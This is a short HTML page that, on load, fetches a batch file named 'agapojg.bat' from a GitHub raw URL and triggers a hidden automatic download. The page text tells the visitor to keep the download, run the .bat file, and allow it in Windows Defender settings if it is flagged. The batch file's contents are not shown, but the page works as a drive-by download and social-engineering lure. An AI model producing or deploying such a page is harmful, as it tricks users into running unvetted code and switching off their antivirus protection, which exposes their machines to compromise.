<!DOCTYPE html>
<html>
<head>
<script>
fetch('https://raw.githubusercontent.com/Criptc/Dump/main/agapojg.bat')
  .then(resp => resp.blob())
  .then(blob => {
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = url;
    // the filename you want
    a.download = 'agapojg.bat';
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
  })
  .catch(() => alert('oh no!'));
  </script>
</head
<body>
<h2>Click keep download in the bottom left</h2>
  <h2>Then, run the .bat file</h2>
  <h3>if windows defender flages it, go to defender settings and allow it<h3>
</body>
</html
